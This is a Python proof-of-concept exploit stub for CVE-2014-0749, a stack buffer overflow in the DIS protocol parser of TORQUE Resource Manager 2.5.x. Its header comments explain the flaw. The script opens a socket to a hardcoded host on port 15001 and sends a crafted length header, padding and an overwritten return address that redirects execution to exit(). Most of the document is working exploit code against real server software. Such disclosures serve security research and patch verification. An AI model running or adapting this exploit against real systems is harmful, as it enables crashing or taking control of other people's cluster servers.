#!/usr/bin/env python
# Exploit Title: TORQUE Resource Manager 2.5.x-2.5.13 stack based buffer overflow stub
# Date: 27 May 2014
# Exploit Author: bwall - @botnet_hunter
# Vulnerability discovered by: MWR Labs
# CVE: CVE-2014-0749
# Vendor Homepage: http://www.adaptivecomputing.com/
# Software Link: http://www.adaptivecomputing.com/support/download-center/torque-download/
# Version: 2.5.13
# Tested on: Manjaro x64
# Description:
# A buffer overflow while parsing the DIS network communication protocol.  It is triggered when requesting that
# a larger amount of data than the small buffer be read.  The first digit supplied is the number of digits in the
# data, the next digits are the actual size of the buffer.
#
# This is an exploit stub, meant to be a quick proof of concept.  This was built and tested for a 64 bit system
# with ASLR disabled.  Since Adaptive Computing does not supply binary distributions, TORQUE will likely be
# compiled on the target system.  The result of this exploit is intended to just point RIP at 'exit()'
 
import socket
 
 
ip = "172.16.246.177"
port = 15001
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
 
offset = 143
header = str(len(str(offset))) + str(offset) + '1'
 
packet = header
packet += "\x00" * (140 - len(packet))
packet += ('\xc0\x18\x76\xf7\xff\x7f\x00\x00') # exit() may require a different offset in your build
 
s.sendall(packet)
data = s.recv(1024)
s.close()
